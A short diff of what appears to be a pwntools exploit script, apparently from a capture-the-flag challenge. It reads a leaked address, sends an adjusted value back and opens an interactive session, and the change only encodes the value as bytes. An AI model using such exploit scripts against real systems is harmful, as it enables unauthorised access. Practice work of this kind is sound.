@@ -70,7 +70,7 @@ addr = p.recvline()
 addr = int(addr, 16) + 1
 print('addr:', addr)
 p.recvuntil(b':')
-p.sendline(str(addr))
+p.sendline(bytes(str(addr), encoding='utf-8'))
 p.recvuntil(b':')
 p.sendline(b'')
 p.interactive()
